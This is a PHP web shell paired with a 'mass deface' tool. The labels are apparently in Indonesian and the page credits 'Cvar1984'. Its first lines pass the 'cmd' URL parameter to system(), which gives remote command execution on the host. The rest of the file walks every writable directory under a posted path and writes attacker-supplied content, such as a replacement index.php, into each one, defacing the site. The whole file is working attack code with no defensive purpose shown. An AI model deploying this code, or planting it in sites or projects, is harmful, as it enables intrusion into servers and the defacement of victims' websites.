<?php
echo '<pre>';
system($_GET['cmd']);
echo '<pre>';

function bikin_file($namafile,$script){
$fp2 = fopen($namafile,"w");
fputs($fp2,$script);

}
function buka_dir($getcwd){
	if(is_writable($getcwd)){
	$nama = $_POST['nama'];
	$script = $_POST['script'];
	$a = scandir("$getcwd");
foreach($a as $aa){
	if($aa == "." | $aa == ".."){
	}elseif(is_dir("$getcwd/$aa")){

		$dir_baru = "$getcwd/$aa";
		if(is_writable($dir_baru)){
		echo "<font color='lime'>.$dir_baru/$nama<br></font>";
		$create_file = bikin_file("$dir_baru/$nama", "$script");
		$baa = buka_dir($dir_baru);
	}
	else{
		echo "<font color='red'>Dir Error</font>";
	}
}
}	
}
else{
	echo "<font color='red'>Dir Error</font>";
}
}
if($_POST){
$cwd = $_POST['dir'];
$coba = buka_dir($cwd);
echo $coba;
}
else{
	echo "<title>Mass Deface</title>
 <head>
       <font color='red'>
   <div align='center'>
<b>       <h1 style='color:yellow;'>--=( _ Deface Massal _ )=--</h1>
<pre>
		\     .--.
		  \   |o_o |
		      |:_/ |
		      //   \ \
		     (|     | )
		    /'\_   _/`\
		    \___)=(___/
			</pre></b></font>
      <font color='yellow'>
	  <hr color='blue' />
	  </head>
	  <body bgcolor='black'>
<table>
							<tr><td><form method='post' action='?action'></td></tr>
							<tr><td><input type='text' name='dir' placeholder='Dir' style='color:lime;background-color:black;'></td> </tr>
							<tr><td><input type='text' name='nama' placeholder='index.php' style='color:lime;background-color:black;'></td> </tr>
							<tr><td><textarea rows='10' cols='19px' name='script' placeholder='Hacked By Cvar1984' style='color:lime;background-color:black;'></textarea></td></tr>

							<br><tr><td><input type='submit' value='Hajar'></td></tr>
							</form>
						</table>
</div>
</body>
</font>
<hr color='blue' />";
}
?>